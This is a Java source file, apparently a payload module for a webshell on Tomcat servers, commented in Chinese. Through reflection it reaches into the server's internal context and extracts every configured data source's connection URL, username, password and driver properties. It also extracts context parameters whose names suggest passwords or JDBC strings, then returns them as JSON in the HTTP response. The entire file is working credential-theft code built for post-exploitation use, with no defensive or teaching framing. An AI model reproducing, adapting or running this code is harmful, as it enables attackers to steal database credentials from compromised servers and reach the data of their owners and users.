// 连接池/数据源凭据枚举载荷（Tomcat）：StandardContext.namingResources.resources →
// ContextResource（name/type + properties：url/username/password/driverClassName 等）。
// 另枚举 context 参数（web.xml context-param——常含连接串）。输出 JSON。
// 约束：默认包、全反射、单 class、零跨类引用。
public class WsmEnumDb {

	public boolean equals(Object ctx) {
		String out;
		try { out = go(ctx); }
		catch (Throwable e) { out = "!ERR " + e; }
		try { write(respOf(ctx), out); } catch (Throwable ignored) {}
		return true;
	}

	String go(Object ctx) throws Exception {
		Object req = reqOf(ctx);
		if (req == null) throw new Exception("no request context");
		Object facade = req.getClass().getMethod("getServletContext").invoke(req);
		StringBuilder sb = new StringBuilder("{\"resources\":[");
		try {
			Object appCtx = field(facade, "context");
			Object sc = field(appCtx, "context");
			Object nr = call(sc, "getNamingResources");
			if (nr != null) {
				Object[] res = (Object[]) call(nr, "findResources");
				boolean first = true;
				if (res != null) {
					for (Object r : res) {
						if (r == null) continue;
						if (!first) sb.append(",");
						first = false;
						sb.append("{\"name\":").append(q(str(call(r, "getName"))))
							.append(",\"type\":").append(q(str(call(r, "getType"))));
						sb.append(",\"props\":{");
						try {
							// Tomcat 9 无公开 getProperties()：listProperties() 迭代 + getProperty(k) 取值
							java.util.Iterator it = (java.util.Iterator) call(r, "listProperties");
							boolean fp = true;
							while (it.hasNext()) {
								String k = str(it.next());
								if (!fp) sb.append(",");
								fp = false;
								sb.append(q(k)).append(":").append(q(str(call(r, "getProperty", k))));
							}
						} catch (Throwable ignored) {}
						sb.append("}}");
					}
				}
			}
		} catch (Throwable ignored) {}
		sb.append("],\"params\":{");
		try {
			java.util.Iterator it = ((java.util.Map) call(facade, "getInitParameters")).entrySet().iterator();
			boolean fp = true;
			while (it.hasNext()) {
				java.util.Map.Entry e = (java.util.Map.Entry) it.next();
				String k = str(e.getKey());
				if (k.toLowerCase().contains("pass") || k.toLowerCase().contains("jdbc")
					|| k.toLowerCase().contains("url") || k.toLowerCase().contains("database")
					|| k.toLowerCase().contains("datasource") || k.toLowerCase().contains("ds.")) {
					if (!fp) sb.append(",");
					fp = false;
					sb.append(q(k)).append(":").append(q(str(e.getValue())));
				}
			}
		} catch (Throwable ignored) {}
		sb.append("}}");
		return sb.toString();
	}

	static Object call(Object target, String method) throws Exception {
		return target.getClass().getMethod(method).invoke(target);
	}

	static Object call(Object target, String method, Object arg) throws Exception {
		return target.getClass().getMethod(method, arg.getClass()).invoke(target, arg);
	}

	static Object field(Object target, String name) throws Exception {
		Class<?> c = target.getClass();
		while (c != null) {
			try {
				java.lang.reflect.Field f = c.getDeclaredField(name);
				f.setAccessible(true);
				return f.get(target);
			} catch (NoSuchFieldException e) { c = c.getSuperclass(); }
		}
		throw new Exception("field not found: " + name);
	}

	static String str(Object o) { return o == null ? "" : String.valueOf(o); }

	static String q(String s) {
		return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t") + "\"";
	}

	static Object reqOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) { Object[] a = (Object[]) ctx; return a.length > 0 ? a[0] : null; }
		try { return ctx.getClass().getMethod("getRequest").invoke(ctx); } catch (Throwable ignored) {}
		return ctx;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) { Object[] a = (Object[]) ctx; return a.length > 1 ? a[1] : null; }
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
